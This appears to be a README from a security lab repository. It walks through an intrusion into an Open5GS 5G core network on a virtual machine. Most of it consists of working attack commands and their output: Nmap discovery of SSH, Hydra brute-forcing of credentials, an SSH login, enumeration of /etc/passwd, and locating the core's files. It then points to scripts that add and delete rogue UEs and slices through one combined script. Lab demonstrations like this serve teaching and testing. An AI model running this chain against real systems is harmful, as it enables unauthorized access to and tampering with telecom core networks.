# SSH Intruision

In this example the core network (running on 10.0.2.4) has an ssh server running to give admins remote access. The goal is for an attacker to discover this server, get access, and adjust the registered User epuipments as they like.

## Step One - Discovery

First the SSH server has to be discovered, this will be done with [Nmap](https://nmap.org/).
``` console
user@ue:~$ sudo nmap -p ssh 10.0.2.4 #check ssh
```
Resulting in the output:
``` console
Starting Nmap 7.80 ( https://nmap.org ) at 2022-11-28 16:10 CET
Nmap scan report for 10.0.2.4
Host is up (0.00068s latency).

PORT   STATE SERVICE
22/tcp open  ssh
MAC Address: 08:00:27:A1:1D:E8 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 0.27 seconds
```

## Step Two - Bruteforce

To connect to the server we need the login information of a user. For this we will use [Hydra](https://www.kali.org/tools/hydra/) which uses the list of most common passwords and usernames to try to find functioning pair of login data.
``` console
user@ue:~$ hydra -I -L ../Lists/Username_list.txt -P ../Lists/Password_list.txt 10.0.2.4 ssh -t 4
```
Resulting in the output:
``` console
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-11-28 16:10:17
[DATA] max 4 tasks per 1 server, overall 4 tasks, 374 login tries (l:17/p:22), ~94 tries per task
[DATA] attacking ssh://10.0.2.4:22/
[22][ssh] host: 10.0.2.4   login: admin   password: admin
[STATUS] 66.00 tries/min, 66 tries in 00:01h, 308 to do in 00:05h, 4 active
[STATUS] 47.33 tries/min, 142 tries in 00:03h, 232 to do in 00:05h, 4 active
[STATUS] 41.29 tries/min, 289 tries in 00:07h, 85 to do in 00:03h, 4 active
[STATUS] 41.12 tries/min, 329 tries in 00:08h, 45 to do in 00:02h, 4 active
[STATUS] 40.56 tries/min, 365 tries in 00:09h, 9 to do in 00:01h, 4 active
1 of 1 target successfully completed, 1 valid password found
```
## Step Three - Access

Now that we have access to the server we log in useing the password and username we found in the above step.
``` console
user@ue:~$ ssh admin@10.0.2.4
```

## Step Four - Poking about

Now that we are in the machine, we want to check where we can find core services running also if there might be other users on the machine.
``` console
admin@core:~$ otheruser=$(grep -w -v -e "nologin" -e "bin/false" -e "admin" -e "root" -e "sync" /etc/passwd | cut -d ":" -f 1)
admin@core:~$ echo "there is another user:  ${otheruser}"
admin@core:~$ path_to_open_5gs=$(find / -type d -name "open5gs" | head -n 1)
admin@core:~$ echo ${path_to_open_5gs}
admin@core:~$ cd ${path_to_open_5gs}
```

Once we have the path of Open5gs we can use the python API to delete and or add subscribed UE's. Surprisngly for this we will not need the login data that is needed to do the same from the web front end. To see the procces for that please refer to files [create_rogue_ue.sh](./create_rogue_ue.sh) and [delete_rogue_ue.sh](./delete_rogue_ue.sh)

## Step Five - Put it all together

To do all the following:

1. Scan for an ssh server.
2. Brutforce login.
3. Add a rogue UE with a Rogue Slice in the core.
4. Connect that rogue UE to the core. (in the works)
5. Delete the rogue UE and slice.

run the following:

```console
user@ue:~$ ./ssh_rogue.sh
```

